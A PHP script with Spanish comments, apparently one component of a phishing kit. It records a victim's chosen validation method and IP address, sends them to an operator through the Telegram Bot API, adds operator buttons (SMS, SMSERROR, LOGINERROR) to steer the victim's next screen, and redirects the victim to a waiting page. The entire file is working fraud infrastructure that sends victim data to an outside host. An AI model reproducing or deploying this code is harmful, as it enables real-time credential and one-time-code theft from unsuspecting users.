<?php
session_start();

// Aseguramos que exista un nombre de usuario único
if (!isset($_SESSION['usuario'])) {
    $_SESSION['usuario'] = 'cli_' . rand(1000, 9999); // Si no lo envió desde antes, se crea uno
}

$usuario = $_SESSION['usuario'];
$tipo = $_POST['tipo'] ?? 'no especificado';

// Obtener IP
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

require_once("settings.php");
// Botones para controlar desde Telegram
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"]
        ],
        [
            ["text" => "❓ SMSERROR", "callback_data" => "SMSERROR|$usuario"],
            ["text" => "📧 LOGINERROR", "callback_data" => "LOGINERROR|$usuario"]
        ]
    ]
];

// Enviar mensaje a Telegram
$mensaje = "✅ Cliente seleccionó método de validación: $tipo\n👤 Usuario: $usuario\n🌐 IP: $ip";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
]));

// Redirigir al cliente a espera.php
header("Location: espera.php");
exit;
?>
